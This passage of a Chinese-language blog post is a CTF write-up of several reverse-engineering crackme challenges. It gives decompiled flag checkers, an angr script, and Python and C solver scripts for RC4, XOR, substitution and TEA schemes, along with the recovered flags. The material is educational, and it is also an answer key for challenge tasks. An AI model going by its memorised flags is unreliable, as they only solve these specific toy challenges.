v7; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Please Enter Flag:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%24s&quot;, s);</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  sub_400686(s, v3);</span><br><span class="line">  for ( i = 0; i &lt; ___; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( s[i] != ____[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Error Flag!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Success!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在加密函数sub_400686加密后与正确字符串进行比较</p>
<p>sub_400686函数，通过查看代码可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400686(__int64 a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  unsigned __int8 v3; // ST1F_1</span><br><span class="line">  unsigned int v4; // eax</span><br><span class="line">  unsigned __int8 v5; // ST1F_1</span><br><span class="line">  unsigned int v6; // eax</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  unsigned int v8; // [rsp+20h] [rbp-20h]</span><br><span class="line">  int v9; // [rsp+24h] [rbp-1Ch]</span><br><span class="line">  int i; // [rsp+28h] [rbp-18h]</span><br><span class="line">  int v11; // [rsp+2Ch] [rbp-14h]</span><br><span class="line">  signed int j; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 k; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">    _[i] = i;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  for ( j = 0; j &lt;= 255; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = ((_[j] + v11 + __[j % _]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    v11 = (v2 + LOBYTE(_[j]) + v11 + __[j % _]) - v2;</span><br><span class="line">    v3 = _[j];</span><br><span class="line">    _[j] = _[v11];</span><br><span class="line">    _[v11] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( k = 0LL; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    result = k;</span><br><span class="line">    if ( k &gt;= a2 )</span><br><span class="line">      break;</span><br><span class="line">    v8 = ((((v8 + 1) &gt;&gt; 31) &gt;&gt; 24) + v8 + 1) - (((v8 + 1) &gt;&gt; 31) &gt;&gt; 24);</span><br><span class="line">    v4 = ((v9 + _[v8]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    v9 = (v4 + v9 + LOBYTE(_[v8])) - v4;</span><br><span class="line">    v5 = _[v8];</span><br><span class="line">    _[v8] = _[v9];</span><br><span class="line">    _[v9] = v5;</span><br><span class="line">    v6 = ((_[v9] + _[v8]) &gt;&gt; 31) &gt;&gt; 24;</span><br><span class="line">    *(k + a1) = *(a1 + k) ^ LOBYTE(_[(v6 + LOBYTE(_[v9]) + LOBYTE(_[v8])) - v6]);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的第一种方法就是angr自己跑出来flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from angr import *   											#导入angr模块</span><br><span class="line">logging.getLogger(&apos;angr.manager&apos;).setLevel(logging.DEBUG)     	#记录日志</span><br><span class="line">p = Project(&quot;re1&quot;,auto_load_libs=False)                   #加载目标文件,参数一是目标文件名，参数二是 是否自动加载依赖。</span><br><span class="line">state=p.factory.entry_state()    								#创建一个状态，默认是程序的入口地址，也可以指定地址作为入口地址：addr = 0x400000</span><br><span class="line">sm=p.factory.simulation_manager(state) 							#创建一个模拟器来模拟程序执行</span><br><span class="line">res=sm.explore(find=0x40091D,avoid=0x4008FA)  					#执行模拟器，find和avoid参数来作为约束条件</span><br><span class="line">print len(res.found) 											#查看执行后的结果有多少个</span><br><span class="line">print res.found[0].posix.dumps(0)</span><br></pre></td></tr></table></figure>
<p>out：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING | 2019-04-08 23:31:33,700 | [34mangr.analyses.disassembly_utils[0m | [34mYour version of capstone does not support MIPS instruction groups.[0m</span><br><span class="line">1</span><br><span class="line">bdctf&#123;YOU_CRAKE_THE_RC4&#125;</span><br><span class="line">[Finished in 46.1s]</span><br></pre></td></tr></table></figure></p>
<p>第二种方法就是劫持程序流程，在执行加密函数的时候提前把参数改成正确的加密后的字符串，然后函数返回值就是flag了，具体过程我就不再写了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag_data = [0x62,0x64,0x63,0x74,0x66,0x7b,0x59,0x4f,0x55,0x5f,0x43,0x52,0x41,0x4b,0x45,0x5f,0x54,0x48,0x45,0x5f,0x52,0x43,0x34,0x7d]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(len(flag_data)):</span><br><span class="line">	flag+=chr(flag_data[x])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h4 id="flag-bdctf-YOU-CRAKE-THE-RC4"><a href="#flag-bdctf-YOU-CRAKE-THE-RC4" class="headerlink" title="flag: bdctf{YOU_CRAKE_THE_RC4}"></a>flag: bdctf{YOU_CRAKE_THE_RC4}</h4><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby_reverse"></a>baby_reverse</h3><p>linux上64位可执行文件，</p>
<p>main函数，进入一个加密函数，把输入的字符串进行加密，再与正确字符串进行比较<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-1E0h]</span><br><span class="line">  char v5; // [rsp+F0h] [rbp-F0h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x1EuLL);</span><br><span class="line">  printf(&quot;Please Input Key: &quot;, 0LL);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;v5);</span><br><span class="line">  encode(&amp;v5, (__int64)&amp;s);</span><br><span class="line">  if ( !strcmp(&amp;s, enflag) )</span><br><span class="line">    puts(&quot;You are Right&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>encode函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall encode(const char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[32]; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char v4[32]; // [rsp+30h] [rbp-50h]</span><br><span class="line">  char v5[36]; // [rsp+50h] [rbp-30h]</span><br><span class="line">  int v6; // [rsp+74h] [rbp-Ch]</span><br><span class="line">  int len; // [rsp+78h] [rbp-8h]</span><br><span class="line">  int i; // [rsp+7Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  len = 18;</span><br><span class="line">  i = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  if ( strlen(a1) != 18 )</span><br><span class="line">    return puts(&quot;Your Length is Wrong&quot;);</span><br><span class="line">  puts(&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;);</span><br><span class="line">  for ( i = 0; i &lt; len; i += 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = len ^ (a1[i] + 6);</span><br><span class="line">    v4[i + 1] = (a1[i + 1] - 6) ^ len;</span><br><span class="line">    v3[i + 2] = a1[i + 2] ^ 6 ^ len;</span><br><span class="line">    *(_BYTE *)(a2 + i) = v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + 1LL) = v4[i + 1];</span><br><span class="line">    *(_BYTE *)(a2 + i + 2LL) = v3[i + 2];</span><br><span class="line">  &#125;</span><br><span class="line">  return a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>把输入的字符串每三个分成一组，进行不同的运算，生成新字符串和正确字符串比较，那么我们可以通过正确的字符串反推出来应该输入的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">current = &quot;bIwhroo8cwqgwrxusi&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(0,len(current),3):</span><br><span class="line">	flag += chr((ord(current[x])^18)-6)</span><br><span class="line">	flag += chr((ord(current[x+1])^18)+6)</span><br><span class="line">	flag += chr((ord(current[x+2])^18)^6)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h4 id="flag：jactf-w0w-is-flag"><a href="#flag：jactf-w0w-is-flag" class="headerlink" title="flag：jactf{w0w_is_flag}"></a>flag：jactf{w0w_is_flag}</h4><h3 id="py"><a href="#py" class="headerlink" title="py"></a>py</h3><p>下载下来的文件是一个pyc文件，有在线解密的网站，解密一波发现解密失败</p>
<p>在本地生成一个pyc文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m 1.py</span><br></pre></td></tr></table></figure>
<p>把这两个文件都用winhex打开发现题目提供的pyc文件头少了4个字节的内容</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A50PWn.png" alt> </p>
<p>把缺少的4字节的数据填上去然后保存，再去解密就可以成功的转成py代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">print &apos;[-]Please input your key:&apos;</span><br><span class="line">key = raw_input()</span><br><span class="line">flag = &quot;=Xm/&gt;*&lt;&amp;?*=+:)k)=&apos;@)&lt;.@-n)mZn.&lt;&quot;</span><br><span class="line">flags = &apos;&apos;</span><br><span class="line">for q in range(len(key)):</span><br><span class="line">    if q % 2 == 0:</span><br><span class="line">        flags += chr(ord(key[q]) + 10)</span><br><span class="line">        continue</span><br><span class="line">    flags += chr(ord(key[q]) - 10)</span><br><span class="line"></span><br><span class="line">if flags == flag:</span><br><span class="line">    print &apos;[-]Good!&apos;</span><br><span class="line">else:</span><br><span class="line">    print &apos;[-]Wrong!&apos;</span><br></pre></td></tr></table></figure>
<p>根据加密代码合一反推：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">current = &quot;=Xm/&gt;*&lt;&amp;?*=+:)k)=&apos;@)&lt;.@-n)mZn.&lt;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(len(current)):</span><br><span class="line">	if x%2==0:</span><br><span class="line">		flag+=chr(ord(current[x])-10)</span><br><span class="line">	else:</span><br><span class="line">		flag+=chr(ord(current[x])+10)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h4 id="flag-3bc94420543503a331632867d3cdd82"><a href="#flag-3bc94420543503a331632867d3cdd82" class="headerlink" title="flag:3bc94420543503a331632867d3cdd82"></a>flag:3bc94420543503a331632867d3cdd82</h4><h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p>32位win可执行程序</p>
<p>main函数：限制输入的长度小于37，然后进入sub_401090函数进行验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // kr00_4</span><br><span class="line">  char Buf; // [esp+4h] [ebp-2Ch]</span><br><span class="line">  char Dst; // [esp+5h] [ebp-2Bh]</span><br><span class="line"></span><br><span class="line">  Buf = 0;</span><br><span class="line">  memset(&amp;Dst, 0, 0x27u);</span><br><span class="line">  printf(&quot;Welcome The System\nPlease Input Key:&quot;);</span><br><span class="line">  gets_s(&amp;Buf, 40u);</span><br><span class="line">  v3 = strlen(&amp;Buf);</span><br><span class="line">  if ( (unsigned int)(v3 - 35) &lt;= 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( sub_401090((int)&amp;Buf, v3) == 1 )</span><br><span class="line">      printf(&quot;Well Done!\n&quot;);</span><br><span class="line">    else</span><br><span class="line">      printf(&quot;Your Wrong!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>sub_401090函数：限制了长度等于35，然后进行一系列的操作，每一位处理之后都和byte_4021A0中的值进行比较</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">signed int __fastcall sub_401090(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ebx</span><br><span class="line">  int v4; // edx</span><br><span class="line">  char v5; // al</span><br><span class="line">  int v6; // esi</span><br><span class="line">  int v7; // edi</span><br><span class="line">  char v8; // al</span><br><span class="line">  int v9; // eax</span><br><span class="line">  char v10; // cl</span><br><span class="line">  int v11; // eax</span><br><span class="line">  int v12; // ecx</span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  if ( a2 != 35 )</span><br><span class="line">    return -1;</span><br><span class="line">  v4 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *(_BYTE *)(v4 + v2);</span><br><span class="line">    v6 = (v5 &gt;&gt; 4) % 16;</span><br><span class="line">    v7 = (16 * v5 &gt;&gt; 4) % 16;</span><br><span class="line">    v8 = byte_402150[2 * v4];</span><br><span class="line">    if ( v8 &lt; 48 || v8 &gt; 57 )</span><br><span class="line">      v9 = v8 - 87;</span><br><span class="line">    else</span><br><span class="line">      v9 = v8 - 48;</span><br><span class="line">    v10 = byte_402151[2 * v4];</span><br><span class="line">    v11 = 16 * v9;</span><br><span class="line">    if ( v10 &lt; 48 || v10 &gt; 57 )</span><br><span class="line">      v12 = v10 - 87;</span><br><span class="line">    else</span><br><span class="line">      v12 = v10 - 48;</span><br><span class="line">    if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) )</span><br><span class="line">      break;</span><br><span class="line">    if ( ++v4 &gt;= 35 )</span><br><span class="line">      return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的解密脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">data = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x1,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x4,0xc7,0x23,0xc3,0x18,0x96,0x5,0x9a,0x7,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x9,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x0,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x2,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0xc,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0xb,0xdb,0xe0,0x32,0x3a,0xa,0x49,0x6,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x8,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x3,0xf6,0xe,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0xd,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0xf,0xb0,0x54,0xbb,0x16]</span><br><span class="line">byte_402150 = &quot;2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6&quot;</span><br><span class="line">byte_402151 = &quot;a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6&quot;</span><br><span class="line">def my_de(ch,index):</span><br><span class="line">	v5=ch</span><br><span class="line">	v6=(v5&gt;&gt;4)%16</span><br><span class="line">	v7 = (16*v5&gt;&gt;4)%16</span><br><span class="line">	v8=ord(byte_402150[2*index])</span><br><span class="line">	if v8&lt;48 or v8&gt;57:</span><br><span class="line">		v9=v8-87</span><br><span class="line">	else:</span><br><span class="line">		v9=v8-48</span><br><span class="line">	v10 = ord(byte_402151[2*index])</span><br><span class="line">	v11 = v9*16</span><br><span class="line">	if v10&lt;48 or v10 &gt;57:</span><br><span class="line">		v12 = v10-87</span><br><span class="line">	else:</span><br><span class="line">		v12=v10-48</span><br><span class="line">	if data[16*v6+v7]==(v11+v12)^0x19:</span><br><span class="line">		return chr(ch)</span><br><span class="line">	else:</span><br><span class="line">		return 0</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for y in range(35):</span><br><span class="line">	for x in range(32,128):</span><br><span class="line">		a = my_de(x,y)</span><br><span class="line">		if a!=0:</span><br><span class="line">			flag+=a</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h4 id="flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3"><a href="#flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3" class="headerlink" title="flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}"></a>flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</h4><h3 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h3><p>在main函数中通过”_”将输入的字符串进行分割，前6位限制必须是数字，md5加密后是“1f74648e50a6a6708ec54ab327a163d5536b7ced”，解密发现是122333</p>
<p>对后八位进行TEA加密，然后与正确字符串进行比较，key=“yeyeyess”</p>
<p>C语言解密代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">//加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i &lt; 32; i++) &#123;                       /* basic cycle start */</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line">//解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i&lt;32; i++) &#123;                         /* basic cycle start */</span><br><span class="line">        v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]=&#123;0x1CD6202D,0x31792AC4&#125;,k[4]=&#123;0x65796579,0x73736579,0xcccccccc,0xcccccccc&#125;;</span><br><span class="line">    // v为要加密的数据是两个32位无符号整数</span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line">    // printf(&quot;加密前原始数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    // encrypt(v, k);</span><br><span class="line">    printf(&quot;加密后的数据：%u %u\n&quot;,v[0],v[1]);</span><br><span class="line">    decrypt(v, k);</span><br><span class="line">    printf(&quot;解密后的数据：%x %x&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于这个key我有点蒙圈，在内存中看是“0x65796579,0x73736579,0xcccccccc,0xcccccccc”，但是在代码中看的是“yeyeyess”，emmm</p>
<p>解密后得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  re ./en</span><br><span class="line">加密后的数据：483794989 830024388</span><br><span class="line">解密后的数据：676e6150 6e696c6f</span><br><span class="line">➜  re</span><br></pre></td></tr></table></figure>
<p>可以16进制转字符串得到</p>
<h4 id="jactf-122333-Pangolin"><a href="#jactf-122333-Pangolin" class="headerlink" title="jactf{122333_Pangolin}"></a>jactf{122333_Pangolin}</h4>
        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
